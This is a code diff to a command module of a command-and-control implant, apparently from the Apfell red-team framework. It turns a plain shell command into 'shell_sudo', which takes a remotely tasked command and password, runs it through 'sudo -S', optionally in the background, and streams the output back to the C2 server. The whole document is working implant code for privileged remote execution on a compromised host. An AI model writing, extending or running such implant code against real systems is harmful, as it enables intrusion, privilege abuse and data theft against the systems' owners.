@@ -1,17 +1,33 @@
-def shell(apfell, c2, params="whoami", task_id=-1):
+def shell_sudo(apfell, c2, params="", task_id=-1):
     try:
         import subprocess
         import time
+        import json
     except Exception as e:
         c2.post_response(response="Failed to import modules", task_id=task_id)
         apfell.remove_job(task_id)
         return
     # execute a shell command and stream the output back to the apfell server as necessary
     try:
-        process = subprocess.Popen(params, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+        json_params = json.loads(params)
+        if 'background' not in json_params:
+            json_params['background'] = False
+        if json_params['background']:
+            command = "sudo -S -b {}".format(json_params['cmd'])
+        else:
+            command = "sudo -S {}".format(json_params['cmd'])
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
     except Exception as e:
         c2.post_response(response="Failed to start process", task_id=task_id)
         apfell.remove_job(task_id)
+    try:
+        #print("about to write in password")
+        process.stdin.write(json_params['password'] + "\n\n")
+        #print("just wrote in password")
+    except Exception as e:
+        c2.post_response(response="Failed to write to stdin for password: {}".format(str(e)), task_id=task_id)
+        apfell.remove_job(task_id)
+        return
     while True:
         try:
             output = ""
@@ -37,6 +53,6 @@ def shell(apfell, c2, params="whoami", task_id=-1):
             c2.wait()
         except Exception as e:
             print("Exiting thread due to: {}\n".format(str(e)))
-            break   
+            break
     apfell.remove_job(task_id)
 COMMAND_ENDS_HERE
